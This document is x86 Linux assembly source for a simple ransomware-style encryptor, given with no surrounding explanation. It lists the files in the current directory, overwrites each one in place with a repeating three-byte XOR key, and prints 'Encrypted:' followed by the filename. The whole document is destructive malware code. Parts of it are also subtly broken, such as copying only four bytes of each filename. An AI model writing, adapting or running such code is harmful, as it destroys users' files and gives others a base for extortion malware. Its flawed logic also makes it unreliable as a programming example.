section .data
	pm db "Encrypted: ",0
	pml equ $-pm
	k db 3,11,75
	kl equ $-k
	nl db 0xa
section .bss
	fn resd 32
	fnl resd 32
	fd resb 8
	fr resq 64
	fsz resd 32
section .text
	global _start
_start:
	xor eax, eax
	push eax
	push byte '.'

	; Open current folder
	mov al, 5
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80

	test eax,eax
	jz fail

	;  getdents syscall
	mov ebx,eax
	xor edx,edx
	xor eax,eax
	mov dx, 0x3210
	sub esp, edx
	mov ecx, esp
	mov al, 141
	int 0x80

	xchg eax,edx

L1:
	test edx,edx
	jz short .END1
	pusha
	lea eax, [ecx+10]

	; Get filename lenght
	.strlen:
	mov esi, eax
	.strlen_loop:

	movzx edi, byte[eax]
	test edi,edi
	jz .strlen_end
	inc eax
	jmp short .strlen_loop

	.strlen_end:
	mov ebx, [esi]
	cmp ebx, byte '.'
	je short .L11
	cmp ebx, dword ".."
	je short .L11
	mov [fn], ebx
	mov edx, eax
	sub edx, esi
	mov [fnl], dl
	xor eax,eax
	; Encrypting file
	call enc
	jmp .PPM
	.L11:
		popa
		movzx eax, word[ecx+8]
		add ecx, eax
		sub edx,eax
		jmp short L1
	.END1:
		mov eax, 1
		mov ebx, 0
		int 0x80
	.PPM:
		; Write Encrypted: bla bla
		mov eax, 4
		mov ebx, 1
		mov ecx, pm
		mov edx, pml
		int 0x80
		mov eax, 4
		mov ebx, 1
		mov ecx, fn
		mov edx, [fnl]
		int 0x80
		mov eax, 4
		mov ebx, 1
		mov ecx, nl
		mov edx, 1
		int 0x80
		jmp .L11

exit:
	; Exit
	xor ebx, ebx
    xor eax, eax
    inc eax
    int 0x80

fail:
	mov ebx, eax
	xor eax, eax
	inc eax
	int 0x80

enc:
	; Open file for reading its size
	mov eax, 5
	mov ebx, fn
	xor ecx, ecx
	mov edx, 0777
	int 0x80
	cmp eax, 0
	jl fail
	; lseek for reading filesize
	mov ebx, eax
	mov [fd], ebx
	mov eax, 19
	mov ecx, 0
	mov edx, 2
	int 0x80
	; Move file size to variable and close file
	mov [fsz], eax
	mov eax, 6
	mov ebx, [fd]
	int 0x80
	; Allocate file size in memory
	mov eax, 45
	xor ebx, ebx
	int 0x80
	mov [fr], eax
	mov ebx, [fsz]
	add ebx, eax
	mov eax, 45
	int 0x80
	cmp eax, 0
	jl fail
	; Open file again to read data
	mov eax, 5
	mov ebx, fn
	xor ecx, ecx
	mov edx, 0777
	int 0x80
	; Read file data
	mov edx, [fsz]
	mov eax, 3
	mov ebx, [fd]
	mov ecx, [fr]
	int 0x80
	; Close file reading mode
	mov eax, 6
	mov ebx, [fd]
	int 0x80
	; Open file again to write encrypted data
	mov eax, 5
	mov ebx, fn
	xor ecx, ecx
	mov ecx, 1
	mov edx, 0777
	int 0x80
	mov [fd], eax
	; Encrypting file data
	mov eax, [fr]
	mov edi, k
	mov ecx, [fsz]
	xor edx, edx
	call encrypt_xor
	; Writing encrypted data to file
	mov ecx, eax
	mov eax, 4
	mov ebx, [fd]
	mov edx, [fsz]
	int 0x80
	mov eax, 6
	mov ebx, [fd]
	int 0x80
	ret

encrypt_xor:
	; Xor encryption
	cmp edx, kl
	je .Kc0
	mov bl, [edi+edx]
	xor [eax+ecx-1], bl
	inc edx
	loop encrypt_xor
	ret
	.Kc0:
		xor edx, edx
		jmp encrypt_xor
